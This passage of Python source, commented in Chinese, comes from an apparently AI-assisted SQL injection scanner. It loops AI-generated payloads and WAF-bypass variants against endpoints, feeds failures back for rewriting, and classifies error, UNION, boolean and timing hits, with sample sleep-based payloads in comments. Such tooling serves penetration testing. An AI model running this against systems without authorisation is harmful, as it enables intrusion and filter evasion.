                             "criteria": (f"过滤画像：单变量探针 {row.get('label')} "
                                          f"触发 SQL 报错（基线无）"),
                             "matched_keyword": "profile", "weak": False,
                             "elapsed_ms": 0})
                vectors_hit.add("error")
                break
        except Exception as exc:
            bus.publish("scan", f"[ai_probe] 过滤画像失败（忽略）: {exc}", level="warn")

    # ---- 反馈环第二轮：把上一轮实际结果 + sqlmap 结论回喂 AI，让它**按真实反馈改写** ----
    # 这一轮回答的是「AI 会不会根据实际结果构造新语句」——之前没有这个回路。
    if not hits and tried > 0:
        try:
            round2 = ai.generate_payloads(db, endpoint, waf_profile, strategies=strategies,
                                          probe_context=probe_ctx,
                                          attempt_history=attempts[:10],
                                          sqlmap_output=sqlmap_output)
        except Exception as exc:
            bus.publish("scan", f"[ai_probe] 反馈环改写失败: {exc}", level="warn")
            round2 = []
        seen_pl = {str(a.get("payload")) for a in attempts}
        for p in (round2 or [])[:3]:
            pl = p.get("payload")
            if not pl or pl in seen_pl:
                continue
            seen_pl.add(pl)
            for variant in ([pl] + ai.bypass_variants(pl))[:6]:
                url, rp, rd = _build_request(endpoint, target_param, variant)
                try:
                    resp = safe_client.request(endpoint.method, url, params=rp,
                                               data=rd, payload=variant)
                except Exception:
                    continue
                tried += 1
                if _is_waf_block(resp):
                    blocked_count += 1
                    attempts.append({"payload": variant, "outcome": "被拦截"})
                    continue
                text = (resp.text or "")[:5000]
                kw = _match_error_keyword(text)
                if kw and not re.search(kw, base_text, re.IGNORECASE):
                    revealed = _weak_error_is_revealed(
                        kw, None, silent_payloads, attempts)
                    weak = _is_parse_error(kw) and not revealed
                    hits.append({"payload": variant, "vector": "error",
                                 "criteria": (f"反馈改写后绕过揭示 {kw}（普通形态被过滤）"
                                              if revealed else
                                              (f"反馈改写后触发弱报错 {kw}（基线无）"
                                               if weak else f"反馈改写后触发报错 {kw}（基线无）")),
                                 "matched_keyword": kw, "weak": weak, "elapsed_ms": 0})
                    if not weak:
                        vectors_hit.add("error")
                    break
                if "create table" in text.lower() and "create table" not in base_text.lower():
                    hits.append({"payload": variant, "vector": "union",
                                 "criteria": "反馈改写后 UNION 回显 sqlite_master 建表语句",
                                 "elapsed_ms": 0})
                    vectors_hit.add("union")
                    break
                mv = re.search(r"\b\d+\.\d+\.\d+\b", text)
                if mv and mv.group(0) not in base_text:
                    hits.append({"payload": variant, "vector": "union",
                                 "criteria": f"反馈改写后回显版本号 {mv.group(0)}",
                                 "version_echo": mv.group(0), "elapsed_ms": 0})
                    vectors_hit.add("union")
                    break
                attempts.append({"payload": variant, "outcome":
                                 "无变化（疑被过滤）" if _page_key(resp) == base_key
                                 else "无报错无差异"})
            if "union" in vectors_hit or "error" in vectors_hit:
                break

    # ---- 结果分类 ----
    # 双向量一致 → 确认；DBMS 专属强报错 / UNION 版本回显 / sqlite_master 回显
    # 单向量即可确认（强证据本身已是注入控制权证明）
    strong = _has_strong_evidence(hits)
    if len(vectors_hit) >= 2 or strong:
        result_class = "vuln_confirmed"
    elif len(vectors_hit) == 1:
        result_class = "inconclusive"             # 单向量：存疑，不产出
    elif tried > 0 and (blocked_count >= max(2, tried // 2)
                        or silent_count >= max(2, tried // 2)):
        result_class = "waf_blocked"
    elif tried > 0:
        result_class = "no_vuln"
    else:
        result_class = "inconclusive"

    return {"result_class": result_class, "hits": hits, "tried": tried,
            "target_param": target_param, "probe_hint": suspect_siblings}


def _elapsed(client) -> float:
    """SafeHttpClient 上一次请求的**纯 HTTP 往返耗时**（不含本工具限速等待）。"""
    try:
        return float(getattr(client, "last_elapsed", 0.0) or 0.0)
    except (TypeError, ValueError):
        return 0.0


def _has_strong_evidence(hits: list[dict]) -> bool:
    """单向量即可确认的强证据集合。

    受控时间对（真值休眠、同型假值不休眠）也算：条件由我们控制，排除抖动后
    单向量即是注入控制权证据（2026-10-23 某靶场 纯时间盲注靶）。
    """
    return any(h.get("version_echo")
               or h.get("matched_keyword") in _STRONG_ERROR_KEYWORDS
               or h.get("matched_keyword") == "quote_parity"
               or h.get("controlled")
               or "CREATE TABLE" in str(h.get("criteria", ""))
               for h in hits)


def _controlled_time_hit(slow: float, fast: float, delay: int) -> tuple[bool, str]:
    """受控时间对判据：真值分支应休眠、同型假值分支不应。

    2026-10-23 某靶场：`if(1=1,sleep(3),1)` vs `if(1=2,sleep(3),1)`。
    阈值 max(1.5s, delay*0.6)：既容忍抖动，也不会把「本来就不慢」的响应当命中。
    对照组把网络抖动/限流拖慢排除掉，因此单向量即可作为强证据。
    """
    gap = slow - fast
    if slow < 2.0 or gap < max(1.5, delay * 0.6):
        return False, ""
    return True, (f"受控时间对：真值 {slow:.2f}s vs 假值 {fast:.2f}s"
                  f"（差 {gap:.2f}s ≥ {max(1.5, delay * 0.6):.1f}s）")


def _bool_time_hit(t_true: float, t_false: float) -> tuple[bool, str]:
    """布尔对耗时判据（双向）：任一侧显著慢（绝对差 ≥1s 且 ≥2 倍）即为布尔信号。

    真值慢的机理是"返回结果集比空集慢"；假值慢（47887 实测 sqlite_version()<'0'
    3084ms vs >'0' 76ms）机理相反——但耗时差本身就是注入控制权的证据，方向不该限死。
    """
    slow, fast = max(t_true, t_false), min(t_true, t_false)
    if slow - fast < 1.0 or slow < 2.0 * max(fast, 0.2):
        return False, ""
    slow_side = "真值" if t_true > t_false else "假值"
    fast_side = "假值" if t_true > t_false else "真值"
    return True, (f"布尔耗时差异：{slow_side} {slow:.2f}s vs {fast_side} {fast:.2f}s"
                  f"（{slow / max(fast, 0.001):.0f} 倍差，注入控制布尔分支）")


def _has_new_token(text: str, base_text: str) -> bool:
    """响应里是否出现基线没有的、像表名/标识符的新片段（>=2 个，抗动态噪声）。"""
    toks = set(re.findall(r"[A-Za-z_][A-Za-z0-9_]{3,}", text))
    base = set(re.findall(r"[A-Za-z_][A-Za-z0-9_]{3,}", base_text))
    return len(toks - base) >= 2


def _is_silently_filtered(resp, payload: str, base_key) -> bool:
    """靶机"静默过滤"判据：payload 含会被过滤的字符（空格 + SQL 关键字）却毫无反应。

    不返回 WAF 拦截页、也不报错，响应与基线**完全一致** → payload 被吃掉，SQL 未受影响。
    这是区分"没注入"与"注了但被 WAF 吃掉"的关键信号。
    """
    if " " not in payload:
        return False
    if not any(re.search(rf"\b{kw}\b", payload, re.I) for kw in
               ("union", "select", "from", "where", "and", "or", "order")):
        return False
    return _page_key(resp) == base_key


def _normalize_payload(value: str) -> str:
    """payload 进 query/body 前先去掉 URL 编码。

    本工具统一通过 httpx 的 params/data 发送，httpx 会再编码一次；若 payload 里已带
    %27/%20 之类编码，服务端收到的就是字面量 "%27"，注入必然失效。
    这是真 bug 的根因（`encoding` 绕过策略 + 知识库里的编码样本都会踩）。
    """
    if "%" not in value:
        return value
    out = unquote(value)
    return out if out != value else value


def _build_request(endpoint: Endpoint, param: str, value: str):
    """把 payload 填进指定参数；其余 query/body 参数置空，避免干扰（如 category=1）。"""
    value = _normalize_payload(value)
    raw = (endpoint.raw_path or endpoint.path).split("?")[0]
    url = f"http://{endpoint.host}{raw}"

    query_params = {}
    data = {}
    for p in endpoint.params or []:
        loc = p.get("location")
        name = p["name"]
        # 控制参数（action/method/csrf…）保留样例值，否则查询根本不执行
        sib = ((p.get("sample_value") or "")
               if (name or "").lower() in _CONTROL_PARAM_NAMES else "")
        if loc in (None, "query"):
            query_params[name] = value if name == param else sib
        elif loc == "body":
            data[name] = value if name == param else sib
    if param not in query_params and param not in data:
        # 参数未声明时默认走 query
        query_params[param] = value
    return url, (query_params or None), (data or None)


def _build_request_keep(endpoint: Endpoint, param: str, value: str):
    """与 _build_request 相同，但**兄弟参数保留样例值**而不是置空。

    2026-10-23 某靶场 实测：`action=test&username=…` 的控制参数被置空后
    查询根本不执行，所有注入 payload 都打在空气上。手工确认 payload 复测必须
    还原真实请求形态。
    """
    value = _normalize_payload(value)
    raw = (endpoint.raw_path or endpoint.path).split("?")[0]
    url = f"http://{endpoint.host}{raw}"
    query_params, data = {}, {}
    for p in endpoint.params or []:
        loc = p.get("location")
        name = p["name"]
        sib = p.get("sample_value") or ""
        if loc in (None, "query"):
            query_params[name] = value if name == param else sib
        elif loc == "body":
            data[name] = value if name == param else sib
    if param not in query_params and param not in data:
        query_params[param] = value
    return url, (query_params or None), (data or None)


def _probe_confirmed_payload(client, endpoint: Endpoint, param: str, payload: str,
                             base_key, base_text: str) -> tuple[dict | None, int]:
    """用人工确认 payload 做「原样 + 受控假值」复测。返回 (命中或 None, 请求数)。"""
    url, rp, rd = _build_request_keep(endpoint, param, payload)
    try:
        resp = client.request(endpoint.method, url, params=rp, data=rd, payload=payload)
        t1 = _elapsed(client)
    except Exception:
        return None, 1
    requests = 1
    if _is_waf_block(resp):
        return None, requests
    text = (resp.text or "")[:8000]
    echo = _error_echo_hit(text, payload, base_text)
    if echo:
        return ({"payload": payload, "vector": "error",
                 "criteria": f"人工确认 payload 报错回显 {echo}",
                 "version_echo": echo, "elapsed_ms": int(t1 * 1000)}, requests)
    fv = _flip_confirmed(payload)
    if not fv:
        return None, requests
    url2, rp2, rd2 = _build_request_keep(endpoint, param, fv)
    try:
        r_false = client.request(endpoint.method, url2, params=rp2, data=rd2, payload=fv)
        t2 = _elapsed(client)
    except Exception:
        return None, requests + 1
    requests += 1
    time_hit, time_criteria = _bool_time_hit(t1, t2)
    if time_hit:
        return ({"payload": payload, "vector": "boolean",
                 "criteria": f"人工确认 payload 受控对照·{time_criteria}",
                 "elapsed_ms": int(max(t1, t2) * 1000)}, requests)
    k_true, k_false = _page_key(resp), _page_key(r_false)
    if k_true != k_false:
        hit = {"payload": payload, "vector": "boolean",
               "criteria": (f"人工确认 payload 与假值变体响应不同"
                            f"（{len(resp.content)}B vs {len(r_false.content)}B）"),
               "elapsed_ms": 0}
        if k_true == base_key:
            hit["controlled"] = True
            hit["criteria"] = ("受控布尔对（人工确认 payload）：true=基线，false 不同"
                               f"（{len(resp.content)}B vs {len(r_false.content)}B）")
        return hit, requests
    return None, requests


def _false_variant(payload: str) -> str:
    """布尔 true → false 变体兜底。

    **生成端显式声明的 false_variant 优先**（AI 返回已有该字段，逐字符同构、
    只差真假条件——比任何正则猜测都可靠）；这里只兜底两类经典形态：
      · `1=1` / `'1'='1'` 等式对 → 换 2
      · `>` / `<` 不等式对 → 翻转首个比较符（47887 实测 sqlite_version()>'0' 的
        真假对就是翻方向，旧正则认不出、整对被跳过）
    其余形态返回原文（probe_endpoint 会因 true==false 跳过，等生成端补配对）。
    """
    out = re.sub(r"1\s*=\s*1", "1=2", payload)
    out = re.sub(r"'1'\s*=\s*'1'", "'1'='2'", out)
    if out != payload:
        return out
    m = re.search(r"[<>]", payload)
    if m:
        flip = "<" if m.group(0) == ">" else ">"
        return payload[:m.start()] + flip + payload[m.end():]
    return out


def _extract_delay(payload: str, max_delay: int) -> int:
    m = re.search(r"sleep\s*\(\s*(\d+)", payload)
    return min(int(m.group(1)) if m else 5, max_delay)


def _is_waf_block(resp) -> bool:
    if resp.status_code in (403, 406, 412, 418, 429):
        return True
    head = resp.text[:1500].lower()
    return any(k in head for k in ("waf", "拦截", "非法请求", "防火墙", "blocked"))
